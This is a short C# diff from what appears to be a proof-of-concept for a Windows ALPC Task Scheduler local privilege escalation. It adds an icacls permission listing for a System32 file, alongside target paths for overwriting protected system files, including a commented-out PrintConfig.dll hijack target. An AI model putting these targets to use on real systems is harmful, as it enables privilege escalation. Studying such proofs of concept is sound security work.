@@ -19,6 +19,13 @@ namespace ALPC_Poc
             string taskFolderJob = Guid.NewGuid().ToString() + ".job";
 
             string taskFolder = @"C:\Windows\Tasks\" + taskFolderJob ;
+            
+            /*
+            c:\Windows\System32> icacls c:\Windows\System32\license.rtf
+            c:\Windows\System32\license.rtf NT AUTHORITY\SYSTEM:(I)(F)
+                                BUILTIN\Administrators:(I)(F)
+                                BUILTIN\Users:(I)(RX)            
+            */
             string destfile = @"c:\windows\system32\license.rtf";
             // destfile = @"C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_864418199e8fa69d\Amd64\PrintConfig.dll";
 
